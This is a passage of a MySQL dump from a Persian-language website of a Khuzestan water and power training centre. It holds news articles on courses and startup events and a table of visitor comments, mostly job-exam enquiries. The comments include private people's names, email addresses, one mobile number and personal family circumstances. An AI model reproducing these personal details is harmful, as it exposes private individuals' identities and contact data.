	<span style="color:#ee82ee;"><strong>در این دوره، استاندارد </strong><strong><span dir="LTR">ISO 10015</span></strong><strong> به عنوان راهنمای کیفیت آموزش و مکمل </strong><strong><span dir="LTR">ISO 9001</span></strong><strong> معرفی شد. چهار مرحله اصلی این استاندارد شامل:&nbsp; </strong></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="color:#ee82ee;"><strong>۱. شناسایی نیازهای آموزشی</strong></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="color:#ee82ee;"><strong>۲. طراحی و برنامه&zwnj;ریزی آموزش</strong></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="color:#ee82ee;"><strong>۳. اجرای آموزش</strong></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="color:#ee82ee;"><strong>۴. ارزیابی نتایج آموزش</strong></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="color:#ee82ee;"><strong>به صورت عملی و با مثال&zwnj;های واقعی بررسی گردید.&nbsp;</strong></span></p>
<p dir="RTL" style="text-align: justify;">
	<strong>این دوره با بهره&zwnj;گیری از شیوه&zwnj;های نوین آموزشی مانند کار گروهی، پرسش&zwnj;وپاسخ و تحلیل موردی سازمان&zwnj;های موفق اجرا شد. شرکت&zwnj;کنندگان در قالب تیم&zwnj;های چندنفره به طراحی برنامه&zwnj;های آموزشی بر اساس استاندارد پرداختند که با استقبال چشمگیری همراه بود. و&nbsp;در پایان این دوره، از زحمات و همکاری&zwnj;های ارزشمند مدیران و کارشناسان آموزش با اهدای لوح تقدیر و هدایای یادبودی تقدیر به عمل آمد</strong></p>
<p>
	&nbsp;</p>
', '64297seminarr.jpg', 162, '1404/3/7', '12:31:25 PM', 1404, 'خرداد', 3, '7');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (64298, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'مرکز شهدای صنعت آب و برق  خوزستان برگزار می‌کند: رویداد استارتاپی آب هوشمند', '<p dir="RTL">
	فرصتی برای ایده&zwnj;پردازان و استارتاپ&zwnj;های حوزه آب و پساب<span dir="LTR">!</span></p>
', '<p dir="RTL">
	<span style="font-size:16px;"><strong>مرکز شهدای صنعت آب و برق&nbsp; خوزستان برگزار می&zwnj;کند<span dir="LTR">:</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span style="color:#b22222;">رویداد استارتاپی آب هوشمند</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong>فرصتی برای ایده&zwnj;پردازان و استارتاپ&zwnj;های حوزه آب و پساب<span dir="LTR">!</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong>با محورهای تخصصی<span dir="LTR">:</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span style="color:#ff0000;"><span dir="LTR">✅</span> پایش هوشمند کیفیت آب و پساب</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span style="color:#ff0000;"><span dir="LTR">✅</span> تصفیه نوآورانه و بازیافت</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span style="color:#ff0000;"><span dir="LTR">✅</span> پیش&zwnj;بینی و تشخیص آلودگی</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span style="color:#ff0000;"><span dir="LTR">✅</span> سامانه&zwnj;های هشدار سریع منابع آب</span></strong></span></p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span dir="LTR">🎯</span> مزایا<span dir="LTR">:</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span style="color:#008000;"><span dir="LTR">🎓</span> برگزاری کارگاه&zwnj;های منتورینگ</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span style="color:#008000;"><span dir="LTR">🏆</span> جوایز نقدی و تقدیر از ایده&zwnj;های برتر</span></strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span style="color:#008000;"><span dir="LTR">🏢</span> فرصت استقرار تیم&zwnj;های برتر در مرکز رشد</span></strong></span></p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span dir="LTR">📅</span> مهلت ثبت&zwnj;نام: تا ۲۰ خرداد</strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span dir="LTR">📆</span> تاریخ رویداد: ۲۷ خرداد ۱۴۰۴</strong></span></p>
<p dir="RTL">
	<span style="font-size:16px;"><strong><span dir="LTR">🔗</span> ثبت ایده :&nbsp;&nbsp;<span dir="LTR">&nbsp;kwpchc.ir/startup</span></strong></span></p>
<p>
	&nbsp;</p>
', '64298roydadadddddd.jpg', 2292, '1404/3/13', '2:27:27 AM', 1404, 'خرداد', 3, '13');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (64299, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'معرفی ۱۸ هسته فناور مرکز رشد شهدای صنعت آب و برق خوزستان برای دریافت حمایت ۳۰۰ میلیون تومانی', '<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">در پی برگزاری نشست مشترک بین مدیر مرکز رشد شهدای صنعت آب و برق خوزستان و ریاست سازمان بسیج علمی، پژوهشی و فناوری استان، ۱۸ هسته فناور فعال در این مرکز برای دریافت حمایت مالی بلاعوض تا سقف ۳۰۰ میلیون تومان معرفی شدند<span dir="LTR">. </span></span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">در پی برگزاری نشست مشترک بین مدیر مرکز رشد شهدای صنعت آب و برق خوزستان و ریاست سازمان بسیج علمی، پژوهشی و فناوری استان، ۱۸ هسته فناور فعال در این مرکز برای دریافت حمایت مالی بلاعوض تا سقف ۳۰۰ میلیون تومان معرفی شدند<span dir="LTR">.</span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">بر اساس توافق&zwnj;های صورت&zwnj;گرفته، سازمان بسیج علمی خوزستان از توسعه همکاری&zwnj;ها با مرکز رشد استقبال کرده و حمایت از هسته&zwnj;های فناور را در اولویت قرار داده است. این حمایت&zwnj;ها شامل برگزاری رویدادهای تخصصی نظیر ریورس&zwnj;پیچ، همایش&zwnj;های فناورانه و نشست&zwnj;های<span dir="LTR"> B2B </span>می&zwnj;شود. همچنین، این سازمان متعهد شده است تا زیرساخت&zwnj;های لازم و حمایت&zwnj;های مادی و معنوی را برای پیشبرد اهداف این هسته&zwnj;ها فراهم کند<span dir="LTR">. </span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">هسته&zwnj;های فناور واجد شرایط که مراحل اولیه رشد را در مرکز رشد طی کرده&zwnj;اند، می&zwnj;توانند از این حمایت&zwnj;ها بهره&zwnj;مند شوند. در صورت ارتقاء به &laquo;واحد فناور&raquo;، امکان دریافت وام&zwnj;های بدون بهره از طریق مؤسسه پیشگامان نیز برای آنها فراهم خواهد بود. نکته حائز اهمیت این است که تمامی این حمایت&zwnj;ها بدون هرگونه مشارکت مالکیتی در هسته&zwnj;ها انجام می&zwnj;شود تا استقلال و مالکیت فکری آنها حفظ شود<span dir="LTR">.</span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">این ۱۸ هسته فناور در حوزه&zwnj;های مختلفی از جمله فناوری&zwnj;های نوین آب، انرژی&zwnj;های تجدیدپذیر، هوشمندسازی و ایمنی صنعتی فعالیت دارند. بیش از ۹۰ درصد اعضای این تیم&zwnj;ها دارای مدارک تحصیلات تکمیلی بوده و برخی نیز دارای مدارک دکتری و پسادکتری هستند که نشان&zwnj;دهنده ظرفیت علمی و فناورانه بالای آنهاست<span dir="LTR">.</span></span></p>
<p>
	&nbsp;</p>', '64299mojtamaa.jpg', 2342, '1404/3/17', '12:41:19 PM', 1404, 'خرداد', 3, '17');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (64300, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'کرسی آزاداندیشی با موضوع "هوش مصنوعی؛ تهدید یا فرصت" در مرکز علمی کاربردی صنعت آب و برق خوزستان برگزار شد', '<p dir="RTL">
	مرکز علمی کاربردی صنعت آب و برق خوزستان میزبان کرسی آزاداندیشی با موضوع &quot;هوش مصنوعی؛ تهدید یا فرصت؟&quot; بود که با حضور ، دانشجویان ، کارکنان و علاقه مندان به این حوزه برگزار شد<span dir="LTR">. </span></p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">مرکز علمی کاربردی صنعت آب و برق خوزستان میزبان کرسی آزاداندیشی با موضوع &quot;هوش مصنوعی؛ تهدید یا فرصت؟&quot; بود که با حضور ، دانشجویان ، کارکنان و علاقه مندان به این حوزه برگزار شد<span dir="LTR">.</span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">در این نشست تخصصی، دکتر مهدی هودگر به عنوان مدرس، به بررسی ابعاد مختلف هوش مصنوعی، چالشها و فرصتهای پیشروی این فناوری پرداخت. وی در سخنان خود به تأثیرات هوش مصنوعی بر مشاغل، اخلاق دیجیتال، حریم خصوصی و همچنین کاربردهای نوین آن در صنایع مختلف، از جمله صنعت آب و برق اشاره کرد<span dir="LTR">.</span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">دکتر هودگر با اشاره به رشد سریع فناوریهای هوش مصنوعی، تأکید کرد: &quot;هوش مصنوعی یک ابزار قدرتمند است که میتواند همزمان هم فرصتهای بی نظیری خلق کند و هم چالشهای جدی به همراه داشته باشد. نحوه مواجهه ما با این فناوری تعیین کننده آینده آن در اقتصاد، آموزش و جامعه خواهد بود<span dir="LTR">.&quot;</span></span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:14px;">شرکت کنندگان در این مرکز نیز به بیان دیدگاهها و پرسشهای خود در مورد آینده هوش مصنوعی، نقش آن در بهینه&zwnj;سازی مصرف انرژی و چگونگی مقابله با تهدیدات امنیتی ناشی از آن پرداختند<span dir="LTR">.</span></span></p>
<p>
	&nbsp;</p>', '64300picclas.jpg', 66, '1404/3/17', '12:43:42 PM', 1404, 'خرداد', 3, '17');


-- --------------------------------------------------------

--
-- Table structure for table kw_news_comments
--

DROP TABLE IF EXISTS kw_news_comments;
CREATE TABLE kw_news_comments (
  id int(11) NOT NULL AUTO_INCREMENT,
  news_id int(11) NOT NULL,
  name varchar(100) NOT NULL,
  email varchar(100) NOT NULL,
  message text NOT NULL,
  approved tinyint(1) NOT NULL DEFAULT 0,
  comment_date datetime NOT NULL,
  shamsi_date varchar(50) NOT NULL,
  shamsi_time varchar(50) NOT NULL,
  created_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  KEY idx_news_id (news_id),
  KEY idx_approved (approved),
  KEY idx_comment_date (comment_date)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table kw_news_comments
--

INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80657, 51185, 'علی مغینمی', 'amoghinimi1330@gmail.com', 'دارای مدرک دیپلم هستم .میتونم در آزمون شرکت کنم؟', 0, '2022-08-13 17:33:35', '1401/5/22', '5:33:35 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80658, 51185, 'میلاد کشاورز', 'mmyladkshawrz1240@gmail.com', 'سلام ببخشید تو اگهی زدن بودین استخدام راننده پایه یکم و سیم بان . بنده ویژه جرثقیل هم دارم . اما مدرک تحصیلی دیپلم دارم . میتونم در ازمون شرکت کنم ', 0, '2022-08-21 14:55:36', '1401/5/30', '2:55:36 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80659, 51187, 'شاهین رامیان', 'ramianshahin@gmail.com', 'm7dpy', 0, '2022-08-25 11:09:12', '1401/6/3', '11:09:12 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80660, 51187, 'ایمان غلامی', 'www.imangholami906@gmail.com', 'ثبت نام', 0, '2022-09-10 23:50:47', '1401/6/19', '11:50:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80661, 51190, 'ایمان غلامی', 'www.imangholami906@gmail.com', 'ثبت نام', 0, '2022-09-10 23:55:49', '1401/6/19', '11:55:49 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80662, 51189, 'جمیل جنادله', 'Info@kwphc.ir', '  نتیجه آزمون', 0, '2022-09-13 02:38:04', '1401/6/22', '2:38:04 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80663, 51190, ' حمید', 'Hamidrahimi69@gmail.com', 'سلام ادمین جان برای ازمون مشخص نشده از چ مطالبی ازمون گرفته میشه ', 0, '2022-09-18 22:43:39', '1401/6/27', '10:43:39 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80664, 51190, 'علی ', 'alijavar74@gmail.com', 'کارت ورود به جلسه
', 0, '2022-09-19 07:12:08', '1401/6/28', '7:12:08 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80665, 51190, 'علی ', 'alijavar74@gmail.com', 'کارت ورود به جلسه
', 0, '2022-09-19 07:12:11', '1401/6/28', '7:12:11 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80666, 51190, 'علی ', 'alijavar74@gmail.com', 'کارت ورود به جلسه
', 0, '2022-09-19 07:12:13', '1401/6/28', '7:12:13 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80667, 51190, 'علی ', 'alijavar74@gmail.com', 'کارت ورود به جلسه
', 0, '2022-09-19 07:12:16', '1401/6/28', '7:12:16 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (80668, 51190, 'علی', 'rayhane8103@gmail.com', 'سلام نتایج کی اعلام میشه', 0, '2022-09-30 20:14:45', '1401/7/8', '8:14:45 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (81660, 52189, 'مصطفی', 'M.ravangard1365@gmail.cim', 'سلام لطفاً مهندسی کامپیوتر رو هم تو این ازمون بذارید', 0, '2022-10-21 23:07:45', '1401/7/29', '11:07:45 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (81661, 52189, 'علی بروایه ', 'ali.borvayeh75@gmail.com', 'سلام علی بروایه هستم ۲۶سالمه تحصیلات دیپلم پایان خدمت گواهینامه رانندگی ۲سال سابقه کار در انبار مرکزی افق کورش بودم من تاسیسات کارم فنی تعمیرات جوش لوله کشی کولر ابگرمکن هر کاری که میگید فنی بلدم مکانیکی بیکارم خانواده دارم تو گردنم برادر بزرگه ۴۵سالشه معلول جسمی زهنی بامنه مادرم از کمیته امداد حقوق میگیره اقام فوت کرده ساکن اهواز فاز یک پاداد دست به اچار هستم  و ۲سال جورچین انبار افق کورش بودم  داخل شرکت فولاد هم بودم پروژه ای جویای کارم اگه کسی میتونه کاری کنه برام ممنونشم میشم 09169860916 علی بروایه ', 0, '2022-10-23 18:09:55', '1401/8/1', '6:09:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (81662, 52189, 'هادی', 'kingarrow9.75th@gmail.com', 'درود 
مولف منابع رو خواستیم
الان دو سه تا مولف دارن و نمیدونیم از کدوم سوال میاد
میشه راهنمایی کنید', 0, '2022-10-27 14:36:16', '1401/8/5', '2:36:16 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (81663, 52189, 'جابربندری', 'bandarijaber393@gmail.com', 'جهت ثبت نام آزمون استخدامی نیروی حجمی اپراتوربرق', 0, '2022-10-30 09:08:36', '1401/8/8', '9:08:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (81664, 52189, 'محمد امین صفدریان ', 'mohammad.amin.safdariyan1997@gmail.com', '  اپراتور', 0, '2022-11-01 11:19:09', '1401/8/10', '11:19:09 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (81665, 52189, 'bijan', 'bijan.rahmati44@gmail.com', ' استخدامی', 0, '2022-11-05 21:54:55', '1401/8/14', '9:54:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (81666, 52189, 'bijan', 'bijan.rahmati44@gmail.com', ' استخدامی', 0, '2022-11-05 21:55:00', '1401/8/14', '9:55:00 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (81667, 52191, 'محمد حسین اسکافی', 'm.h.sinaaa@gmail.com', 'mc', 0, '2022-11-06 18:34:20', '1401/8/15', '6:34:20 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82660, 51185, 'محمدامین پورجلالی', 'daduarko@gmail.com', 'کارت آزمون', 0, '2022-11-14 01:04:29', '1401/8/23', '1:04:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82661, 52191, 'محمدامین پورجلالی', 'daduarko@gmail.com', 'کارت آزمون', 0, '2022-11-14 01:06:55', '1401/8/23', '1:06:55 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82662, 52191, 'رسول عساکره', 'asakereh23@yahoo.com', 'سلام وقت بخیر . تاریخ اعلام نتایج آزمون  نصب و تعمیرات نیروگاه ها که ۲۶ آبان بود . کی هست؟', 0, '2022-11-20 00:00:04', '1401/8/29', '12:00:04 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82663, 52189, 'حبیب زیدی', 'habizay88@gmail.com', 'لینک ثبت نام رو میخوام', 0, '2022-11-21 19:15:34', '1401/8/30', '7:15:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82664, 52189, 'صادق سلامت نژاد', 'Zoweiry.maadiran@yahoo.com', 'استخدام', 0, '2022-11-27 22:29:56', '1401/9/6', '10:29:56 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82665, 52189, 'Sahand', 'Sahandnika@gmail.com', 'سلام 
زمان اعلام نتایج آزمون رو میگین؟ از همینجا باید مشاهده کنیم ؟', 0, '2022-11-29 07:32:11', '1401/9/8', '7:32:11 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82666, 53190, 'صحنی', 'farhang.khadamat@gmail.com', 'سلام برای ثبت نام به کدوم سامانه مراجعه کنم؟؟', 0, '2022-11-29 17:17:00', '1401/9/8', '5:17:00 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82667, 53190, 'صحنی', 'farhang.khadamat@gmail.com', 'سلام برای ثبت نام به کدوم سامانه مراجعه کنم؟؟', 0, '2022-11-29 17:17:06', '1401/9/8', '5:17:06 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82668, 52189, 'Sahand', 'Sahandnika@gmail.com', 'سلام 
خبری از اعلام نتایج نشد؟؟ حداقل بگین چه زمانی منتظر باشیم', 0, '2022-12-02 12:55:05', '1401/9/11', '12:55:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82669, 51185, 'مهدی طایفی هویزه نژاد ', 'mhdytayfy@gmail.com', 'سلام ', 0, '2022-12-03 13:18:39', '1401/9/12', '1:18:39 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82670, 52191, 'عارف ناصرپور', 'Arefnaserpour265@gmail.com', 'تاریخ نتایج ازمون چ موقع زده میشود
', 0, '2022-12-05 00:51:45', '1401/9/14', '12:51:45 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82671, 53190, 'علی', 'Lygarmsyry@gmail.com', 'باسلام.درخواست شرکت در آزمون ب عنوان سیمبان', 0, '2022-12-06 19:43:26', '1401/9/15', '7:43:26 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82672, 53192, 'سید حسام الدین وکیلی', 's.hesam.vakili@gmail.com', 'سلام چرا گزینه مشاهده نتایج فعال نیست ؟', 0, '2022-12-11 19:05:40', '1401/9/20', '7:05:40 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82673, 53192, 'نضال مقدم ', 'nezalmoghaddam@gmail.com', 'با سلام 
بنده از پذیرفته شدگان آزمون شرکت نصب و تعمیرات نیروگاهای خوزستان هستم و زمانی که میخواستم مدارکم را آپلود کنم به دلیل آپلود نکردن گواهی اشتغال مرتبط اجازه ثبت نهایی را نداد با توجه به اینکه ما تا روز چهارشنبه بیشتر وقت اپلود ندارم ممنون میشم هر چه سریعتر مرا توجیه کنید. متشکرم ', 0, '2022-12-12 20:20:07', '1401/9/21', '8:20:07 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82674, 53192, 'نضال مقدم ', 'nezalmoghaddam@gmail.com', 'با سلام 
بنده از پذیرفته شدگان آزمون شرکت نصب و تعمیرات نیروگاهای خوزستان هستم و زمانی که میخواستم مدارکم را آپلود کنم به دلیل آپلود نکردن گواهی اشتغال مرتبط اجازه ثبت نهایی را نداد با توجه به اینکه ما تا روز چهارشنبه بیشتر وقت اپلود ندارم ممنون میشم هر چه سریعتر مرا توجیه کنید. متشکرم ', 0, '2022-12-12 20:20:18', '1401/9/21', '8:20:18 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82675, 53192, 'نضال مقدم ', 'nezalmoghaddam@gmail.com', 'با سلام 
بنده از پذیرفته شدگان آزمون شرکت نصب و تعمیرات نیروگاهای خوزستان هستم و زمانی که میخواستم مدارکم را آپلود کنم به دلیل آپلود نکردن گواهی اشتغال مرتبط اجازه ثبت نهایی را نداد با توجه به اینکه ما تا روز چهارشنبه بیشتر وقت اپلود ندارم ممنون میشم هر چه سریعتر مرا توجیه کنید. متشکرم ', 0, '2022-12-12 20:20:21', '1401/9/21', '8:20:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (82676, 53192, 'نضال مقدم ', 'nezalmoghaddam@gmail.com', 'با سلام 
بنده از پذیرفته شدگان آزمون شرکت نصب و تعمیرات نیروگاهای خوزستان هستم و زمانی که میخواستم مدارکم را آپلود کنم به دلیل آپلود نکردن گواهی اشتغال مرتبط اجازه ثبت نهایی را نداد با توجه به اینکه ما تا روز چهارشنبه بیشتر وقت اپلود ندارم ممنون میشم هر چه سریعتر مرا توجیه کنید. متشکرم ', 0, '2022-12-12 20:32:34', '1401/9/21', '8:32:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (83672, 53193, 'محمدرضا ', 'spahri1353@gmail.com', 'سلام... آیا شاغلین شرکت های طرف قرارداد سازمان آب و برق خوزستان نیز از تخفیف شاغلین صنعت آب و برق برخودار هستند یا میشوند', 0, '2023-01-01 21:28:34', '1401/10/11', '9:28:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (83673, 53193, 'سعید سبحانی نیا', 'saeidsobhani89@gmail.com', 'با سلام بنده دانشجوی دکتری برق قدرت هستم. آیا در دانشکده مجتمع استاد هم پذیرش می شود؟
ممنون', 0, '2023-01-04 09:48:01', '1401/10/14', '9:48:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (83674, 53192, 'hadi', 'ghayemhadi@gmail.com', 'سلام وقت بخیر
جواب مصاحبه پذیرفته شدگان آزمون استخدامی اپراتور پست برق نیروهای حجمی که در تاریخ ۸/۲۶ برگزار شد چه تاریخی اعلام میشه؟', 0, '2023-01-07 19:56:16', '1401/10/17', '7:56:16 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84672, 53192, 'hadi', 'ghayemhadi@gmail.com', 'سلام وقت بخیر نتیجه مصاحبه تاریخ ۱۴۰۱/۱۰/۱۳ چه زمانی اعلام میشه؟', 0, '2023-01-17 07:31:33', '1401/10/27', '7:31:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84673, 54193, 'پژمان حاتمی', 'pezhman8766@gmail.cim', 'درود، چه مدرک تحصیلی برای این آزمون قابل قبول هست؟ ', 0, '2023-01-26 18:06:32', '1401/11/6', '6:06:32 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84674, 54193, 'عبدالامیر سالمی', 'Khdyjhnwasrboy@gmail.com', 'متولد 1372


', 0, '2023-01-26 18:32:39', '1401/11/6', '6:32:39 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84675, 54193, 'عبدالامیر سالمی', 'Khdyjhnwasrboy@gmail.com', 'متولد 1372


', 0, '2023-01-26 18:32:42', '1401/11/6', '6:32:42 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84676, 54193, 'نوید قصابیانی', '.ghassabiani@gmail.com', 'باسلام لطفا شرایط ازمونی رو بفرستید
ممنونم', 0, '2023-01-26 19:28:21', '1401/11/6', '7:28:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84677, 54193, 'حسین', 'hosseinbajy@gmail.com', 'ثبت نام آزمون', 0, '2023-01-27 02:29:33', '1401/11/7', '2:29:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84678, 54193, 'Mehdi.salamat', 'Mehdi.salamat6067001@gmali.com', 'ثبت نام ', 0, '2023-01-27 02:51:54', '1401/11/7', '2:51:54 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84680, 54193, 'سید حسین کلکچی دزفولی', 'Hosein.kalakche@gmail.com', 'سلام وقت بخیر 
میخواهم در آزمون شرکت کنم.', 0, '2023-01-27 13:24:41', '1401/11/7', '1:24:41 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84681, 54193, 'مصطفی دریس غانم', 'mahann.deris@gmail.com', 'سلام', 0, '2023-01-27 16:52:29', '1401/11/7', '4:52:29 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84682, 51185, 'سجاد شریفی ', 'Shryfys@gmil.com', 'ثبت نام ', 0, '2023-01-27 18:40:20', '1401/11/7', '6:40:20 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84683, 51185, 'سجاد شریفی ', 'Shryfys@gmil.com', 'ثبت نام ', 0, '2023-01-27 18:40:28', '1401/11/7', '6:40:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84684, 51185, 'سجاد شریفی ', 'Shryfys@gmil.com', 'ثبت نام ', 0, '2023-01-27 18:40:34', '1401/11/7', '6:40:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84685, 54193, 'سجاد مرادی  مهری ', 'www.sajadmoradi137@gmaile.com', 'شرکت  در آزممون', 0, '2023-01-28 01:27:29', '1401/11/8', '1:27:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84686, 54193, 'عباس خسرواحمدی ', 'ahmdyb09@gmail.com', '45yy5', 0, '2023-01-28 09:28:37', '1401/11/8', '9:28:37 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (84687, 54193, 'رحیم خواجه میری', 'rhymkhwajhmyry9@gmail.com', 'F', 0, '2023-01-28 10:08:13', '1401/11/8', '10:08:13 AM');
